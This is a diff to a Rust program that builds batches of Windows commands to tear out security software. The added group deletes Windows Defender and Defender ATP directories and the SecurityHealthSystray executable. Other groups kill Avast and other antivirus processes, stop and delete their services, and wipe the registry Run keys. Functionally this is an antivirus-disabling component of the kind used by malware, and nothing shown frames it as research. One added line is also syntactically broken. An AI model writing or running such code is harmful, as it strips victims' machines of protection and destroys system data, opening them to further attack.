@@ -648,8 +648,19 @@ fn main() -> io::Result<()> {
             r#"rd /s /q "%ProgramFiles(x86)%\McAfee""#,
         ];
         commands.extend(mcafee_dirs_cmds);
+ 
+        // Group 7: Windows Defender and Advanced Threat Protection cleanup
+        let defender_dirs_cmds = vec![
+            r#"del /f /y "%SystemRoot%\System32\SecurityHealthSystray.exe""#,
+            r#"rd /s /q "%ProgramFiles%\Windows Defender""#,
+            r#"rd /s /q "%ProgramFiles(x86)%\Windows Defender""#,
+            r#"rd /s /q "%ProgramData%\Microsoft\Windows Defender""#,
+            r#"rd /s /q "%ProgramFiles%\Windows Defender Advanced Threat Protection""#,
+            r#"rd /s /q "%ProgramFiles(x86)%\Windows Defender Advanced Threat Protection""#,
+        ];
+        commands extend(defender_dirs_cmds);
 
-        // Group 7: Kill antivirus processes
+        // Group 8: Kill antivirus processes
         let kill_processes_cmds = vec![
             // AVAST
             "taskkill /F /IM AvastSvc.exe /T",
@@ -663,7 +674,7 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(kill_processes_cmds);
 
-        // Group 8: Stop antivirus services
+        // Group 9: Stop antivirus services
         let stop_services_cmds = vec![
             // Avast
             "sc stop AvastSvc",
@@ -681,7 +692,7 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(stop_services_cmds);
 
-        // Group 9: Delete antivirus services
+        // Group 10: Delete antivirus services
         let delete_services_cmds = vec![
             // Avast
             "sc delete AvastSvc",
@@ -699,7 +710,7 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(delete_services_cmds);
 
-        // Group 10: Delete registry keys for antivirus programs
+        // Group 11: Delete registry keys for antivirus programs
         let delete_registry_cmds = vec![
             // Startup keys
             r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
